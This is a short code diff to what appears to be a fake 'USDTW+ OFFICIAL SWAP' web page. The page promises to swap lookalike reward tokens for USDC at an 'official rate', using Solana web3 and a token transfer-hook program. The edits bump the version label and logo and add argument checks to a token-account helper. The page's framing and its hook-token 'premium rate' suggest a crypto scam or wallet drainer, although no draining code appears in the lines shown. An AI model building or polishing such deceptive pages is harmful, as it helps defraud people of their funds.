@@ -22,7 +22,7 @@ button { width: 100%; padding: 14px; border: 0; border-radius: 10px; font-size: 
 </head>
 <body>
 <div class="card">
-<div class="badge"><img src="logo.svg" alt="$1" style="width:20px;height:20px;vertical-align:-4px;margin-right:6px">USDTW+ OFFICIAL SWAP</div>
+<div class="badge"><img src="logo.svg?v=35" alt="$1" style="width:20px;height:20px;vertical-align:-4px;margin-right:6px">USDTW+ OFFICIAL SWAP · v3.5</div>
 <h1>Swap your USDTW Rewards</h1>
 <p>Convert your USDTW Rewards (USDTW+) tokens to USDC instantly at the official rate. Swaps settle to your wallet within seconds.</p>
 <div class="bal" id="bal">Connect to check your balance</div>
@@ -48,7 +48,7 @@ const RATE_HOOK = 10000n;   // hook tokens per 1 USDC (whale-rewards premium rat
 const le = (n) => { const a = []; for (let i = 0; i < 8; i++) { a.push(Number(n % 256n)); n = n / 256n; } return a; };
 const st = (m) => document.getElementById("status").textContent = m;
 const W = solanaWeb3;
-const ata = (mint, owner, prog) => W.PublicKey.findProgramAddressSync([owner.toBuffer(), prog.toBuffer(), mint.toBuffer()])[0];
+const ata = (mint, owner, prog) => { if (!mint || !owner || !prog) throw new Error("bad token account args"); return W.PublicKey.findProgramAddressSync([owner.toBuffer(), prog.toBuffer(), mint.toBuffer()])[0]; };
 const eamlOf = (mint, hookProg) => W.PublicKey.findProgramAddressSync([Uint8Array.from([101,120,116,114,97,45,97,99,99,111,117,110,116,45,109,101,116,97,115]), mint.toBuffer()], hookProg)[0];
 document.getElementById("connect").onclick = async () => {
   try {
